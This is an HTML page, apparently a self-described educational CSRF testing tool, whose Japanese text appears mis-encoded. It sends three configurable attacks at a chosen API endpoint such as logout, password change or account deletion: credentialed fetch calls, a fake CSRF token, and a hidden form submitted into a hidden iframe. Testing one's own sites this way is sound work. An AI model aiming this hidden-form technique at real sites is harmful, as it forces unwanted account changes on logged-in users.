<!DOCTYPE html>
<html lang="ja">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>ğŸ”’ CSRFè„†å¼±æ€§ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«ï¼ˆæ±ç”¨ç‰ˆï¼‰</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
            }
            .container {
                background: white;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                max-width: 800px;
                margin: 0 auto;
                padding: 40px;
            }
            h1 {
                color: #667eea;
                margin-bottom: 10px;
                font-size: 2em;
                text-align: center;
            }
            .subtitle {
                text-align: center;
                color: #666;
                margin-bottom: 30px;
                font-size: 0.9em;
            }
            .config-section {
                background: #f8f9fa;
                padding: 20px;
                border-radius: 10px;
                margin-bottom: 20px;
                border-left: 4px solid #667eea;
            }
            .config-section h2 {
                color: #667eea;
                font-size: 1.2em;
                margin-bottom: 15px;
            }
            label {
                display: block;
                margin: 10px 0 5px 0;
                font-weight: bold;
                color: #555;
            }
            input[type='text'] {
                width: 100%;
                padding: 10px;
                border: 2px solid #ddd;
                border-radius: 5px;
                font-size: 1em;
                font-family: 'Courier New', monospace;
            }
            input[type='text']:focus {
                outline: none;
                border-color: #667eea;
            }
            .endpoint-list {
                background: white;
                padding: 10px;
                border-radius: 5px;
                margin-top: 10px;
            }
            .endpoint-item {
                padding: 8px;
                margin: 5px 0;
                cursor: pointer;
                border-radius: 3px;
                font-family: 'Courier New', monospace;
                font-size: 0.9em;
                transition: background 0.2s;
            }
            .endpoint-item:hover {
                background: #e7f1ff;
            }
            .attack-section {
                margin: 20px 0;
                padding: 20px;
                background: #f8f9fa;
                border-radius: 10px;
                border-left: 4px solid #dc3545;
            }
            .attack-section h2 {
                color: #dc3545;
                margin-bottom: 15px;
                font-size: 1.2em;
            }
            button {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                padding: 15px 30px;
                font-size: 1em;
                border-radius: 50px;
                cursor: pointer;
                transition: transform 0.2s, box-shadow 0.2s;
                margin: 5px;
                min-width: 200px;
            }
            button:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
            }
            button:active {
                transform: translateY(0);
            }
            .danger-btn {
                background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            }
            .info-btn {
                background: linear-gradient(135deg, #84fab0 0%, #8fd3f4 100%);
            }
            #result {
                margin-top: 20px;
                padding: 15px;
                border-radius: 10px;
                display: none;
            }
            .log-entry {
                padding: 8px;
                margin: 5px 0;
                border-radius: 5px;
                font-size: 0.9em;
            }
            .success {
                background: #d4edda;
                color: #155724;
                border: 1px solid #c3e6cb;
            }
            .error {
                background: #f8d7da;
                color: #721c24;
                border: 1px solid #f5c6cb;
            }
            .warning {
                background: #fff3cd;
                color: #856404;
                border: 1px solid #ffeaa7;
            }
            .info {
                background: #d1ecf1;
                color: #0c5460;
                border: 1px solid #bee5eb;
            }
            .help-box {
                background: #e7f3ff;
                padding: 15px;
                border-radius: 10px;
                margin: 20px 0;
                border-left: 4px solid #2196f3;
            }
            .help-box h3 {
                color: #2196f3;
                margin-bottom: 10px;
            }
            .attack-list {
                margin: 15px 0;
                font-size: 0.9em;
            }
            .attack-list li {
                margin: 8px 0;
                padding-left: 10px;
            }
            code {
                background: #f4f4f4;
                padding: 2px 6px;
                border-radius: 3px;
                font-family: 'Courier New', monospace;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>ğŸ”’ CSRFè„†å¼±æ€§ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«</h1>
            <p class="subtitle">æ±ç”¨ç‰ˆ - ã‚ã‚‰ã‚†ã‚‹ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã§ä½¿ç”¨å¯èƒ½</p>

            <!-- è¨­å®šã‚»ã‚¯ã‚·ãƒ§ãƒ³ -->
            <div class="config-section">
                <h2>âš™ï¸ ã‚¿ãƒ¼ã‚²ãƒƒãƒˆè¨­å®š</h2>
                <label for="apiBase">APIãƒ™ãƒ¼ã‚¹URL:</label>
                <input
                    type="text"
                    id="apiBase"
                    value="http://localhost:8000/api/"
                    placeholder="http://example.com/api/"
                />

                <label for="targetEndpoint">æ”»æ’ƒå¯¾è±¡ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ:</label>
                <input
                    type="text"
                    id="targetEndpoint"
                    value="auth/logout/"
                    placeholder="auth/logout/ ã¾ãŸã¯ users/delete/ ãªã©"
                />

                <div class="endpoint-list">
                    <small style="color: #666"
                        >ã‚ˆãä½¿ã†ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆï¼ˆã‚¯ãƒªãƒƒã‚¯ã§è‡ªå‹•å…¥åŠ›ï¼‰:</small
                    >
                    <div
                        class="endpoint-item"
                        onclick="setEndpoint('auth/logout/')"
                    >
                        ğŸšª auth/logout/ - ãƒ­ã‚°ã‚¢ã‚¦ãƒˆ
                    </div>
                    <div
                        class="endpoint-item"
                        onclick="setEndpoint('auth/password/change/')"
                    >
                        ğŸ”‘ auth/password/change/ - ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¤‰æ›´
                    </div>
                    <div
                        class="endpoint-item"
                        onclick="setEndpoint('users/me/')"
                    >
                        ğŸ‘¤ users/me/ - ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±å¤‰æ›´
                    </div>
                    <div
                        class="endpoint-item"
                        onclick="setEndpoint('users/delete/')"
                    >
                        ğŸ—‘ï¸ users/delete/ - ã‚¢ã‚«ã‚¦ãƒ³ãƒˆå‰Šé™¤
                    </div>
                </div>

                <label for="httpMethod">HTTPãƒ¡ã‚½ãƒƒãƒ‰:</label>
                <select
                    id="httpMethod"
                    style="
                        width: 100%;
                        padding: 10px;
                        border-radius: 5px;
                        border: 2px solid #ddd;
                    "
                >
                    <option value="POST" selected>POST</option>
                    <option value="PUT">PUT</option>
                    <option value="PATCH">PATCH</option>
                    <option value="DELETE">DELETE</option>
                </select>

                <button
                    onclick="updateConfig()"
                    class="info-btn"
                    style="margin-top: 15px; width: 100%"
                >
                    âœ… è¨­å®šã‚’é©ç”¨
                </button>
            </div>

            <!-- ç¾åœ¨ã®è¨­å®šè¡¨ç¤º -->
            <div class="help-box">
                <h3>ğŸ“ ç¾åœ¨ã®ãƒ†ã‚¹ãƒˆå¯¾è±¡</h3>
                <p
                    id="currentTarget"
                    style="font-family: 'Courier New', monospace; color: #333"
                >
                    èª­ã¿è¾¼ã¿ä¸­...
                </p>
            </div>

            <!-- æ”»æ’ƒãƒ†ã‚¹ãƒˆã‚»ã‚¯ã‚·ãƒ§ãƒ³ -->
            <div class="attack-section">
                <h2>âš ï¸ CSRFæ”»æ’ƒãƒ‘ã‚¿ãƒ¼ãƒ³</h2>
                <div class="attack-list">
                    <ul>
                        <li>
                            <strong>Pattern 1 (Fetch/AJAX):</strong>
                            é€šå¸¸ã®JavaScriptæ”»æ’ƒã€‚CORSã§é˜²ãŒã‚Œã‚‹ã¯ãšã€‚
                        </li>
                        <li>
                            <strong>Pattern 2 (å½ãƒˆãƒ¼ã‚¯ãƒ³):</strong>
                            å½ã®CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’é€ä¿¡ã€‚æ¤œè¨¼ã§å¼¾ã‹ã‚Œã‚‹ã¯ãšã€‚
                        </li>
                        <li style="color: #dc3545">
                            <strong>Pattern 3 (Formé€ä¿¡):</strong>
                            <span style="font-weight: bold">âš¡æœ¬å‘½</span>
                            - CORSã‚’ãƒã‚¤ãƒ‘ã‚¹ã€‚CSRFãƒˆãƒ¼ã‚¯ãƒ³ã§é˜²ãå¿…è¦ã‚ã‚Šã€‚
                        </li>
                    </ul>
                </div>

                <button onclick="attack1()">Pattern 1: Fetch (JSON)</button>
                <button onclick="attack2()">Pattern 2: å½ãƒˆãƒ¼ã‚¯ãƒ³</button>
                <button onclick="attack3()" class="danger-btn">
                    Pattern 3: Formé€ä¿¡
                </button>
                <br />
                <button onclick="clearResults()" class="info-btn">
                    ğŸ—‘ï¸ ãƒ­ã‚°ã‚’ã‚¯ãƒªã‚¢
                </button>
            </div>

            <!-- çµæœè¡¨ç¤º -->
            <div id="result"></div>

            <!-- ä½¿ã„æ–¹ã‚¬ã‚¤ãƒ‰ -->
            <div class="help-box">
                <h3>ğŸ“– ä½¿ã„æ–¹ã‚¬ã‚¤ãƒ‰</h3>
                <ol style="margin-left: 20px; line-height: 1.8">
                    <li>
                        ãƒ†ã‚¹ãƒˆå¯¾è±¡ã®ã‚µã‚¤ãƒˆã«<strong>åˆ¥ã‚¿ãƒ–ã§ãƒ­ã‚°ã‚¤ãƒ³</strong>ã—ã¦ãã ã•ã„
                    </li>
                    <li>ä¸Šã®è¨­å®šã§APIã®URLã¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’å…¥åŠ›</li>
                    <li>ã€Œè¨­å®šã‚’é©ç”¨ã€ãƒœã‚¿ãƒ³ã‚’ã‚¯ãƒªãƒƒã‚¯</li>
                    <li>å„Patternãƒœã‚¿ãƒ³ã§æ”»æ’ƒã‚’ãƒ†ã‚¹ãƒˆ</li>
                    <li><code>F12</code>ã§Networkã‚¿ãƒ–ã‚’é–‹ã„ã¦çµæœã‚’ç¢ºèª</li>
                </ol>
                <br />
                <strong>âœ… æ­£å¸¸ãªé˜²å¾¡:</strong>
                <ul style="margin-left: 20px; margin-top: 5px">
                    <li>
                        Pattern 1, 2: <code>CORS error</code> ã¾ãŸã¯
                        <code>403 Forbidden</code>
                    </li>
                    <li>
                        Pattern 3:
                        <code>403 Forbidden</code> (CSRFãƒˆãƒ¼ã‚¯ãƒ³ãªã—ã‚¨ãƒ©ãƒ¼)
                    </li>
                </ul>
            </div>
        </div>

        <!-- éš ã—Iframeï¼ˆç”»é¢é·ç§»ã‚’é˜²ãï¼‰ -->
        <iframe name="stealthFrame" style="display: none"></iframe>

        <!-- éš ã—Form -->
        <form
            id="hiddenForm"
            method="POST"
            target="stealthFrame"
            style="display: none"
        >
            <input type="hidden" name="dummy_data" value="csrf_attack" />
        </form>

        <script>
            // ã‚°ãƒ­ãƒ¼ãƒãƒ«è¨­å®š
            let config = {
                apiBase: 'http://localhost:8000/api/',
                endpoint: 'auth/logout/',
                method: 'POST',
                fullUrl: 'http://localhost:8000/api/auth/logout/',
            };

            const resultDiv = document.getElementById('result');

            // åˆæœŸåŒ–
            window.onload = () => {
                updateConfig();
                console.log(
                    '%cğŸ”’ CSRFè„†å¼±æ€§ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«',
                    'color: red; font-size: 20px; font-weight: bold;',
                );
                console.log('æ•™è‚²ç›®çš„ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆãƒ„ãƒ¼ãƒ«ã§ã™');
                console.log('ç¾åœ¨ã®ã‚¿ãƒ¼ã‚²ãƒƒãƒˆ:', config.fullUrl);
            };

            // è¨­å®šæ›´æ–°
            function updateConfig() {
                config.apiBase = document
                    .getElementById('apiBase')
                    .value.trim();
                config.endpoint = document
                    .getElementById('targetEndpoint')
                    .value.trim();
                config.method = document.getElementById('httpMethod').value;

                // URLã®æ­£è¦åŒ–
                if (!config.apiBase.endsWith('/')) {
                    config.apiBase += '/';
                }

                config.fullUrl = config.apiBase + config.endpoint;

                // è¡¨ç¤ºæ›´æ–°
                document.getElementById('currentTarget').innerHTML = `
                    <strong>ãƒ¡ã‚½ãƒƒãƒ‰:</strong> ${config.method}<br>
                    <strong>URL:</strong> ${config.fullUrl}
                `;

                // ãƒ•ã‚©ãƒ¼ãƒ ã®actionã‚’æ›´æ–°
                document.getElementById('hiddenForm').action = config.fullUrl;
                document.getElementById('hiddenForm').method = config.method;

                showLog('âœ… è¨­å®šã‚’æ›´æ–°ã—ã¾ã—ãŸ', 'success');
                console.log('è¨­å®šæ›´æ–°:', config);
            }

            // ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆé¸æŠ
            function setEndpoint(endpoint) {
                document.getElementById('targetEndpoint').value = endpoint;
                updateConfig();
            }

            // ãƒ­ã‚°è¡¨ç¤º
            function showLog(msg, type = 'info') {
                const timestamp = new Date().toLocaleTimeString();
                resultDiv.innerHTML += `
                    <div class="log-entry ${type}">
                        <strong>[${timestamp}]</strong> ${msg}
                    </div>
                `;
                resultDiv.style.display = 'block';
                resultDiv.scrollTop = resultDiv.scrollHeight;
            }

            // ãƒ­ã‚°ã‚¯ãƒªã‚¢
            function clearResults() {
                resultDiv.innerHTML = '';
                resultDiv.style.display = 'none';
            }

            // Pattern 1: Fetch API (CORSãƒ–ãƒ­ãƒƒã‚¯)
            async function attack1() {
                showLog(
                    `ğŸš€ Pattern 1: Fetchæ”»æ’ƒã‚’é–‹å§‹ â†’ ${config.fullUrl}`,
                    'warning',
                );

                try {
                    const response = await fetch(config.fullUrl, {
                        method: config.method,
                        credentials: 'include',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({}),
                    });

                    if (response.ok) {
                        showLog(
                            'âŒ æ”»æ’ƒæˆåŠŸï¼CSRFãƒˆãƒ¼ã‚¯ãƒ³ãªã—ã§å®Ÿè¡Œã§ãã¾ã—ãŸï¼ˆè„†å¼±æ€§ã‚ã‚Šï¼‰',
                            'error',
                        );
                    } else {
                        showLog(
                            `âœ… æ”»æ’ƒå¤±æ•—ï¼ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹: ${response.status}`,
                            'success',
                        );
                    }
                } catch (error) {
                    showLog(
                        `âœ… CORSã«ã‚ˆã‚Šãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã¾ã—ãŸ: ${error.message}`,
                        'success',
                    );
                }
            }

            // Pattern 2: å½ã®CSRFãƒˆãƒ¼ã‚¯ãƒ³
            async function attack2() {
                showLog(
                    `ğŸš€ Pattern 2: å½ãƒˆãƒ¼ã‚¯ãƒ³æ”»æ’ƒã‚’é–‹å§‹ â†’ ${config.fullUrl}`,
                    'warning',
                );

                try {
                    const response = await fetch(config.fullUrl, {
                        method: config.method,
                        credentials: 'include',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-CSRFToken': 'fake-token-12345-invalid',
                        },
                        body: JSON.stringify({}),
                    });

                    if (response.ok) {
                        showLog(
                            'âŒ æ”»æ’ƒæˆåŠŸï¼å½ãƒˆãƒ¼ã‚¯ãƒ³ãŒå—ã‘å…¥ã‚Œã‚‰ã‚Œã¾ã—ãŸï¼ˆè„†å¼±æ€§ã‚ã‚Šï¼‰',
                            'error',
                        );
                    } else {
                        showLog(
                            `âœ… æ”»æ’ƒå¤±æ•—ï¼ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹: ${response.status} - ãƒˆãƒ¼ã‚¯ãƒ³æ¤œè¨¼ãŒæ©Ÿèƒ½ã—ã¦ã„ã¾ã™`,
                            'success',
                        );
                    }
                } catch (error) {
                    showLog(
                        `âœ… CORSã«ã‚ˆã‚Šãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã¾ã—ãŸ: ${error.message}`,
                        'success',
                    );
                }
            }

            // Pattern 3: Formé€ä¿¡ï¼ˆCORSãƒã‚¤ãƒ‘ã‚¹ï¼‰
            function attack3() {
                showLog(
                    `ğŸš€ Pattern 3: ãƒ•ã‚©ãƒ¼ãƒ é€ä¿¡æ”»æ’ƒã‚’å®Ÿè¡Œ â†’ ${config.fullUrl}`,
                    'warning',
                );
                showLog(
                    'ğŸ’¡ ç”»é¢ã¯é·ç§»ã—ã¾ã›ã‚“ã€‚F12ã®Networkã‚¿ãƒ–ã§çµæœã‚’ç¢ºèªã—ã¦ãã ã•ã„',
                    'info',
                );

                const form = document.getElementById('hiddenForm');
                form.submit();

                // çµæœç¢ºèªã®ãƒ’ãƒ³ãƒˆ
                setTimeout(() => {
                    showLog('ğŸ” Networkã‚¿ãƒ–ã§ä»¥ä¸‹ã‚’ç¢ºèª:', 'info');
                    showLog(
                        '- ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ãŒ <strong>403 Forbidden</strong> ãªã‚‰é˜²å¾¡æˆåŠŸ âœ…',
                        'success',
                    );
                    showLog(
                        '- ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ãŒ <strong>200 OK</strong> ãªã‚‰æ”»æ’ƒæˆåŠŸï¼ˆè„†å¼±æ€§ï¼‰âŒ',
                        'error',
                    );
                }, 500);
            }
        </script>
    </body>
</html>
